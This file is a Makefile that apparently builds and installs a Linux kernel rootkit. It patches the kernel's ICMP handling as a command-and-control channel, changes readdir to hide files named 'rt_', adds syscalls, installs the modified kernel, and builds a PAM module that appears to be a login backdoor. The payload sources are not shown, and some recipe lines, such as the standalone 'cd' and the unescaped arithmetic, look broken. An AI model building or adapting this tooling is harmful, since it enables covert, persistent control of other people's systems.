CWD := $(shell realpath .)

basic: pam

all: basic kernel

# kernel
kernel: icmp readdir syscall
	cd /build/linux-6.13.7/
	make -j $((`nproc` / 2)) && make install

# ICMP c2
icmp: 
	cp icmp/icmp-updated.c /build/linux-6.13.7/net/ipv4/icmp.c

# Readdir hiding "rt_" files
readdir: 
	cp readdir/readdir-updated.c /build/linux-6.13.7/fs/readdir.c

# Syscall
syscall:
	cp syscall/syscalls-updated.h /build/linux-6.13.7/include/linux/syscalls.h
	cp syscall/sys-updated.c /build/linux-6.13.7/kernel/sys.c
	cp syscall/syscall_64-updated.tbl /build/linux-6.13.7/arch/x86/entry/syscalls/syscall_64.tbl

# Pam mod
pam: 
	sudo apt install -y libpam0g-dev libpam-modules libpam-runtime libpam-dev >/dev/null
	$(MAKE) -C pam

.PHONY: pam